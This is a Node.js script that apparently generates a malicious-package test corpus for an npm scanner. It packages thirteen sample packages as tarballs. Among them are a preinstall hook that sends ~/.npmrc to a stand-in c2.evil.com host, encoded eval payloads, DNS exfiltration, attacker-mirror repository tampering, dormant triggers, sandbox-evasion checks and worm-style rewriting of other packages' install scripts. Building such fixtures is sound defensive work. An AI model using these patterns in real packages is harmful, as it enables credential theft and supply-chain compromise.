import { execSync } from 'child_process';
import { writeFileSync, mkdirSync, rmSync } from 'fs';
import { join } from 'path';

const BASE = '/tmp/npm-scan-mal';

const MALS = [
  { name: 'shai-hulud', pkg: { scripts: { preinstall: 'curl -d @~/.npmrc https://c2.evil.com/x' } }, js: 'eval(atob("Y3VybCBodHRwOi8vYzIuZXZpbC5jb20="))' },
  { name: 'mal-dns-exfil', pkg: {}, js: 'dns.resolve(key + ".exfil.com", (err, addr) => {})' },
  { name: 'mal-tamper-1', pkg: { name: 'lodash', repository: { url: 'https://github.com/attacker/lodash-mirror.git' } }, js: 'module.exports = { malicious: true }' },
  { name: 'mal-tamper-2', pkg: { name: 'react', repository: { url: 'https://github.com/attacker/react-evil.git' } }, js: '// Source: https://evil.com/react/original.js\nmodule.exports = {}' },
  { name: 'mal-dormant-1', pkg: {}, js: 'if (process.env.NODE_ENV === "production") { eval(atob("Y29uc29sZS5sb2coJ2V2aWwnKQ==")) }' },
  { name: 'mal-dormant-2', pkg: {}, js: 'if (new Date() > new Date("2026-06-01")) { require("./payload.js") }' },
  { name: 'mal-dormant-3', pkg: {}, js: 'if (process.env.CI) { process.exit(0) } else { /* malicious */ require("./exploit.js") }' },
  { name: 'mal-evasion-1', pkg: {}, js: 'if (os.hostname().includes("docker") || os.hostname().includes("sandbox")) { process.exit(0) }' },
  { name: 'mal-evasion-2', pkg: {}, js: 'if (process.argv.join(" ").includes("inspect")) { debugger; /* stop analysis */ }' },
  { name: 'mal-evasion-3', pkg: {}, js: 'try { throw new Error(); } catch(e) { if (e.stack.includes("sandbox")) { process.exit(0) } }' },
  { name: 'mal-prop-1', pkg: { name: '@evil/worm' }, js: 'execSync("npm install ./worm-pkg"); execSync("npm link")' },
  { name: 'mal-prop-2', pkg: {}, js: 'fs.writeFileSync("../lodash/node_modules/worm/index.js", "module.exports = { compromised: true }")' },
  { name: 'mal-prop-3', pkg: { name: 'worm-pkg' }, js: `const pj = require('../express/package.json'); pj.scripts.install = 'node worm.js'; fs.writeFileSync('../express/package.json', JSON.stringify(pj))` },
];

for (const mal of MALS) {
  const dir = join(BASE, mal.name);
  rmSync(dir, { recursive: true, force: true });
  mkdirSync(dir, { recursive: true });
  writeFileSync(join(dir, 'package.json'), JSON.stringify({ name: mal.name, version: '1.0.0', ...mal.pkg }));
  if (mal.js) writeFileSync(join(dir, 'index.js'), mal.js);
  execSync(`tar czf tests/corpus/malicious/${mal.name}.tgz -C ${BASE} ${mal.name}`);
  console.log(`OK ${mal.name}`);
}

console.log('All mal corpus entries generated.');
console.log('Total:', MALS.length);
console.log('New entries: tamper-1, tamper-2, dormant-1, dormant-2, dormant-3, evasion-1, evasion-2, evasion-3');